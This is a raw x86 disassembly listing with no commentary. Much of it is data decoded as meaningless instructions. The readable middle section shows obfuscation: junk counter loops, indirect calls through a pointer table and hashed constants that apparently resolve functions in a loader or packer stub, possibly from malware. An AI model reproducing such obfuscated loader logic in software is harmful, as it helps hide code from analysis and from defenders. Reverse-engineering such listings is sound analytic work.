  410940:	rol    BYTE PTR [ecx-0x264e54fc],0xb4
  410947:	xor    esi,DWORD PTR ss:0xf02d5c60
  41094e:	(bad)  
  41094f:	dec    esp
  410950:	das    
  410951:	xchg   esi,eax
  410952:	push   ebp
  410953:	inc    edx
  410954:	sub    al,0x2a
  410956:	(bad)  
  410957:	stc    
  410958:	test   al,0x2c
  41095a:	mov    ds:0xfd54acb7,al
  41095f:	ret    
  410960:	scas   al,BYTE PTR es:[edi]
  410961:	bound  ebp,QWORD PTR [edx*2-0x44446c7e]
  410968:	call   0x52c261df
  41096d:	cld    
  41096e:	mov    WORD PTR [ebp+0x1d7814a2],ss
  410974:	jp     0x41093b
  410976:	test   al,0x50
  410978:	sbb    ecx,DWORD PTR [edx]
  41097a:	jno    0x4109bb
  41097c:	inc    esi
  41097d:	cmp    al,0x88
  41097f:	in     eax,0x83
  410981:	ss shl ch,cl
  410984:	mov    BYTE PTR [eax],bl
  410986:	inc    ebx
  410987:	cmp    DWORD PTR [ecx+eax*8],esi
  41098a:	sti    
  41098b:	mov    ?,WORD PTR [esi-0x5d858986]
  410991:	sub    eax,0x2d8c58ce
  410996:	les    edi,FWORD PTR [eax+ebx*8+0x7d]
  41099a:	dec    ecx
  41099b:	mov    ds:0xf6837f0,eax
  4109a0:	inc    edi
  4109a1:	sub    DWORD PTR ds:0x68465820,esp
  4109a7:	rcr    edi,1
  4109a9:	rcl    BYTE PTR [ecx],cl
  4109ab:	nop
  4109ac:	sbb    DWORD PTR [edi-0x4ed15a6a],edi
  4109b2:	sbb    al,0x65
  4109b4:	jl     0x41098c
  4109b6:	test   al,0x65
  4109b8:	hlt    
  4109b9:	push   0xc9adee60
  4109be:	adc    BYTE PTR [eax+edi*4-0x38],ch
  4109c2:	jbe    0x410a02
  4109c4:	inc    ebx
  4109c5:	(bad)  
  4109c6:	(bad)  
  4109c7:	fldz   
  4109c9:	lods   eax,DWORD PTR ds:[esi]
  4109ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109cb:	jle    0x4109c7
  4109cd:	jle    0x410a3b
  4109cf:	adc    ah,BYTE PTR [ecx+edx*4]
  4109d2:	stc    
  4109d3:	pop    ss
  4109d4:	bound  ecx,QWORD PTR [ecx]
  4109d6:	mov    esp,0xca3b6662
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx+0x6b62629f],0x4b
  410fc4:	popa   
  410fc5:	cs scas al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x410f62
  410fce:	mov    BYTE PTR [esi-0x59f35b21],ah
  410fd4:	jmp    0x411030
  410fd6:	sahf   
  410fd7:	sbb    DWORD PTR [eax],edx
  410fd9:	mov    al,ds:0x5dcb03fa
  410fde:	and    DWORD PTR [esi-0x15],edi
  410fe1:	idiv   DWORD PTR [ebp+0x28]
  410fe4:	xchg   edx,eax
  410fe5:	loope  0x410ffd
  410fe7:	mov    BYTE PTR [ecx-0x5],cl
  410fea:	sbb    eax,0x9894ab8
  410fef:	xchg   ebx,eax
  410ff0:	test   DWORD PTR [ecx],ebx
  410ff2:	aaa    
  410ff3:	mov    eax,0x81b84c26
  410ff8:	ret    0x9728
  410ffb:	xchg   ebp,eax
  410ffc:	fld    DWORD PTR [esi]
  410ffe:	lods   al,BYTE PTR ds:[esi]
  410fff:	xor    eax,0x7c9febd5
  411004:	out    0x4e,al
  411006:	ud0    ecx,DWORD PTR [esi-0x55634193]
  41100d:	mov    ds:0x8984761b,eax
  411012:	pop    esp
  411013:	sub    ecx,esp
  411015:	ds stc 
  411017:	xchg   ebp,eax
  411018:	cli    
  411019:	mov    ecx,0x2040732b
  41101e:	(bad)  
  41101f:	and    ah,al
  411021:	out    0x5c,eax
  411023:	sbb    bl,BYTE PTR [ebx]
  411025:	xor    al,0x14
  411027:	dec    DWORD PTR [ecx]
  411029:	xchg   ebx,eax
  41102a:	bound  edi,QWORD PTR [eax+0xd]
  41102d:	inc    ebx
  41102e:	adc    esp,ebx
  411030:	dec    edi
  411031:	add    bl,BYTE PTR [eax-0x3d]
  411034:	outs   dx,DWORD PTR ds:[esi]
  411035:	mov    ds:0x14893950,eax
  41103a:	jb     0x411051
  41103c:	push   esi
  41103d:	retf   
  41103e:	push   edx
  41103f:	push   DWORD PTR [edi-0xacd6d8b]
  411045:	pop    eax
  411046:	xchg   esi,eax
  411047:	cli    
  411048:	xchg   esi,eax
  411049:	(bad)
  41104d:	fnsave [ebx]
  41104f:	adc    al,0x53
  411051:	xor    DWORD PTR [edx-0x55],0x77
  411055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411056:	sub    DWORD PTR [edx],ebx
  411058:	add    BYTE PTR [ebp+0x3d],dl
  41105b:	inc    ebp
  41105c:	mov    WORD PTR [ebp+edi*2+0x4b0688ae],cs
  411063:	enter  0x822e,0x6a
  411067:	mov    ds:0xa92da57a,eax
  41106c:	cmp    bh,al
  41106e:	pop    ebx
  41106f:	aas    
  411070:	add    DWORD PTR [ebx],0xfffffff6
  411073:	sub    DWORD PTR [ebp+0x161ed4c1],0x4576b90c
  41107d:	cmp    DWORD PTR [ebx+0x7f6ebda6],esi
  411083:	ret    0x1c3
  411086:	adc    ebx,edx
  411088:	jle    0x4110bb
  41108a:	sub    dh,BYTE PTR [ecx]
  41108c:	sub    al,0x80
  41108e:	and    esi,DWORD PTR [ebp+0x25957c9a]
  411094:	or     al,0xf0
  411096:	sub    al,ah
  411098:	aas    
  411099:	je     0x4110b6
  41109b:	setg   BYTE PTR [eax+0x33ad2244]
  4110a2:	cmp    ebp,esp
  4110a4:	jecxz  0x41109a
  4110a6:	stc    
  4110a7:	lock int 0x23
  4110aa:	cmp    ch,BYTE PTR [ebx+0x2f846be0]
  4110b0:	dec    esi
  4110b1:	pushw  ds
  4110b3:	mov    BYTE PTR [eax-0x12],bh
  4110b6:	push   esp
  4110b7:	lods   al,BYTE PTR ds:[esi]
  4110b8:	or     esi,DWORD PTR [eax]
  4110ba:	jecxz  0x41104f
  4110bc:	adc    DWORD PTR [ebx],edx
  4110be:	adc    eax,0x6d6cefbe
  4110c3:	dec    eax
  4110c4:	inc    ebp
  4110c5:	retf   
  4110c6:	or     bl,BYTE PTR [ebx-0x39]
  4110c9:	ja     0x41104b
  4110cb:	inc    edi
  4110cc:	gs std 
  4110ce:	jbe    0x41109b
  4110d0:	sahf   
  4110d1:	and    eax,0xfccd767a
  4110d6:	push   0xd536fd6e
  4110db:	jg     0x411088
  4110dd:	ret    0x29fd
  4110e0:	xor    edi,DWORD PTR [ebp-0x51]
  4110e3:	xor    ch,BYTE PTR [ebx-0x18]
  4110e6:	or     cl,al
  4110e8:	sar    DWORD PTR [ebx+ebp*2+0x6],1
  4110ec:	fwait
  4110ed:	pushf  
  4110ee:	imul   esi,DWORD PTR [ecx],0xffffffb0
  4110f1:	out    0x21,eax
  4110f3:	cmp    al,0x88
  4110f5:	xchg   edx,eax
  4110f6:	nop
  4110f7:	jl     0x4110cc
  4110f9:	cmp    BYTE PTR [ebx+ebp*4+0x5b],dl
  4110fd:	cmp    al,0xdf
  4110ff:	push   edx
  411100:	add    edx,eax
  411102:	add    bl,BYTE PTR [ebx]
  411104:	into   
  411105:	inc    esi
  411106:	iret   
  411107:	pop    ss
  411108:	mov    ch,0x28
  41110a:	imul   ebx,DWORD PTR [eax-0x6ea9fddf],0x37
  411111:	add    eax,0x5ec22be4
  411116:	outs   dx,BYTE PTR ds:[esi]
  411117:	add    al,0x40
  411119:	add    DWORD PTR [ecx+0x6ed24478],esi
  41111f:	in     eax,dx
  411120:	sub    DWORD PTR [eax+0x44],ebx
  411123:	sub    BYTE PTR [edx+eiz*8+0x5f],dh
  411127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411128:	clc    
  411129:	cdq    
  41112a:	and    BYTE PTR [ecx+0xc],0x53
  41112e:	addr16 cwde 
  411130:	pop    ecx
  411131:	pop    edi
  411132:	or     bh,BYTE PTR [edi+0x7440906b]
  411138:	not    BYTE PTR [eax]
  41113a:	fild   WORD PTR [edi+0x29659b4f]
  411140:	mov    al,0x19
  411142:	adc    eax,0x33519a14
  411147:	dec    esi
  411148:	fdivr  QWORD PTR [ebx-0x4b]
  41114b:	adc    DWORD PTR [edx+eiz*8],esp
  41114e:	push   ecx
  41114f:	and    cl,BYTE PTR [eax-0x2661c246]
  411155:	push   edx
  411156:	add    DWORD PTR [esi-0x143be731],0xffffffea
  41115d:	arpl   WORD PTR [eax+0x23],bx
  411160:	pop    ebx
  411161:	clc    
  411162:	stc    
  411163:	sub    eax,0x159cbe01
  411168:	pushf  
  411169:	inc    esi
  41116a:	ss cli 
  41116c:	out    0x55,al
  41116e:	xor    al,0xa2
  411170:	mov    al,ds:0x21e45fe2
  411175:	test   esp,0xd177bb22
  41117b:	xchg   edi,eax
  41117c:	ret    0x65fc
  41117f:	dec    edi
  411180:	outs   dx,DWORD PTR ds:[esi]
  411181:	out    dx,al
  411182:	pushf  
  411183:	(bad)  
  411185:	out    0x41,al
  411187:	cdq    
  411188:	test   BYTE PTR [ecx+0x2f692d72],bh
  41118e:	fwait
  41118f:	add    eax,esp
  411191:	adc    BYTE PTR [edx-0x5d],al
  411194:	inc    edx
  411195:	mov    ch,0xed
  411197:	add    esp,DWORD PTR [ebx]
  411199:	in     al,0x1d
  41119b:	arpl   WORD PTR [ebx+ecx*4+0x555948ff],di
  4111a2:	xchg   edi,eax
  4111a3:	sub    BYTE PTR [edx],ch
  4111a5:	ss push ebp
  4111a7:	xor    ebp,DWORD PTR [ecx-0x6e508602]
  4111ad:	scas   eax,DWORD PTR es:[edi]
  4111ae:	mov    eax,0x8469bb26
  4111b3:	mov    ?,edi
  4111b5:	jle    0x41117a
  4111b7:	xor    ebp,esp
  4111b9:	inc    edx
  4111ba:	inc    esp
  4111bb:	jle    0x41116d
  4111bd:	xlat   BYTE PTR ds:[ebx]
  4111be:	jmp    0x7c85:0x6f5e4b85
  4111c5:	popa   
  4111c6:	cwde   
  4111c7:	add    eax,0x108e5613
  4111cc:	loop   0x41118d
  4111ce:	std    
  4111cf:	jnp    0x411162
  4111d1:	push   edi
  4111d2:	mov    dl,0x86
  4111d4:	addr16 sti 
  4111d6:	lods   al,BYTE PTR ds:[esi]
  4111d8:	vpinsrw xmm5,xmm6,WORD PTR [edi-0x3fe198ba],0x9c
  4111e1:	ja     0x4111d1
  4111e3:	loop   0x411243
  4111e5:	pop    esi
  4111e6:	ss mov ah,0xbc
  4111e9:	or     bh,ch
  4111eb:	cmp    al,0x70
  4111ed:	jae    0x411262
  4111ef:	fcom   DWORD PTR [edi+0x7b60fa1b]
  4111f5:	(bad)  
  4111f6:	or     ebp,DWORD PTR [esi]
  4111f8:	add    eax,0x12f8330a
  4111fd:	mov    WORD PTR [ecx+esi*4-0x6561e81d],dx
  411205:	xchg   BYTE PTR [edi-0x10785772],dl
  41120b:	or     DWORD PTR [ebx+0x53],esp
  41120e:	retf   0x50db
  411211:	outs   dx,BYTE PTR ds:[esi]
  411212:	enter  0x207f,0x88
  411216:	sbb    BYTE PTR [esi+0x33],ch
  411219:	test   al,0x55
  41121b:	push   esp
  41121c:	xchg   cl,ch
  41121e:	jge    0x411216
  411220:	ret    
  411221:	xor    bh,BYTE PTR [esi-0x43]
  411224:	jle    0x411216
  411226:	out    0x24,al
  411228:	retf   0xf4fb
  41122b:	pop    edi
  41122c:	xchg   edi,eax
  41122d:	fwait
  41122e:	ret    
  41122f:	das    
  411230:	pushf  
  411231:	ror    DWORD PTR [edx],1
  411233:	popa   
  411234:	aas    
  411235:	xchg   edx,eax
  411236:	fcom   st(7)
  411238:	xor    edx,DWORD PTR [esi-0x1c]
  41123b:	inc    ecx
  41123c:	fidiv  DWORD PTR [eiz*4-0x7a6a24a6]
  411243:	ret    
  411244:	addr16 jo 0x41127a
  411247:	shl    cl,1
  411249:	ja     0x4111cc
  41124b:	lods   al,BYTE PTR ds:[esi]
  41124c:	addr16 xchg al,dh
  41124f:	mov    ds:0x38231d5b,al
  411254:	cmp    dh,BYTE PTR [eax]
  411256:	push   esi
  411257:	and    BYTE PTR [ebx-0x7401d247],dh
  41125d:	js     0x41126f
  41125f:	jmp    0x4112d4
  411261:	cmc    
  411262:	int    0xb4
  411264:	xchg   edi,eax
  411265:	fnsave [edi]
  411267:	mov    al,0x4e
  411269:	push   edx
  41126a:	cmp    eax,0xe726202a
  41126f:	add    BYTE PTR [ebp-0x1c7b74f2],bh
  411275:	cmp    al,0x20
  411277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411278:	mov    cl,0xe6
  41127a:	(bad)  
  41127b:	jmp    0x712b:0xba11a611
  411282:	xchg   BYTE PTR [edi],ah
  411284:	add    al,0x1d
  411286:	fsub   DWORD PTR [ecx]
  411288:	cwde   
  411289:	or     eax,0xf806da36
  41128e:	sub    BYTE PTR [edi-0x735c0502],cl
  411294:	adc    ah,BYTE PTR [ebx+edx*4+0x151ec5ff]
  41129b:	retf   
  41129c:	gs push ebx
  41129e:	mov    ebx,0x975b1157
  4112a3:	imul   esp,DWORD PTR [eax],0xc607cb7b
  4112a9:	es in  eax,0x18
  4112ac:	aad    0xbd
  4112ae:	pop    ecx
  4112af:	dec    DWORD PTR [esp+ebp*4]
  4112b2:	push   edx
  4112b3:	inc    edx
  4112b4:	mov    ch,0x25
  4112b6:	pop    ecx
  4112b7:	and    ecx,DWORD PTR [esi+0x70]
  4112ba:	or     BYTE PTR [ebx],ah
  4112bc:	sbb    DWORD PTR [edx+0x67],esp
  4112bf:	mov    cl,0x2f
  4112c1:	mov    ch,0xa5
  4112c3:	cmp    al,0xd9
  4112c5:	test   DWORD PTR [ebx+0x6c18b9ac],0x492298a3
  4112cf:	icebp  
  4112d0:	adc    dl,BYTE PTR [edi+0x75]
  4112d3:	push   es
  4112d4:	pop    edx
  4112d5:	loopne 0x4112f6
  4112d7:	les    ebx,FWORD PTR [edx]
  4112d9:	sub    BYTE PTR [ebx-0xe],ah
  4112dc:	push   esp
  4112dd:	cdq    
  4112de:	sbb    DWORD PTR [eax+0x34],esp
  4112e1:	cdq    
  4112e2:	shl    BYTE PTR [ebp-0x19fd057a],1
  4112e8:	(bad)  
  4112ea:	dec    edx
  4112eb:	loope  0x41129f
  4112ed:	pop    ecx
  4112ee:	pushf  
  4112ef:	mov    dl,0x10
  4112f1:	inc    BYTE PTR [ecx-0x19bc394f]
  4112f7:	loopne 0x411358
  4112f9:	mov    WORD PTR [edx],?
  4112fb:	aad    0x20
  4112fd:	addr16 mov edi,0x3a8c4614
  411303:	cmp    al,0x82
  411305:	ins    DWORD PTR es:[edi],dx
  411306:	cdq    
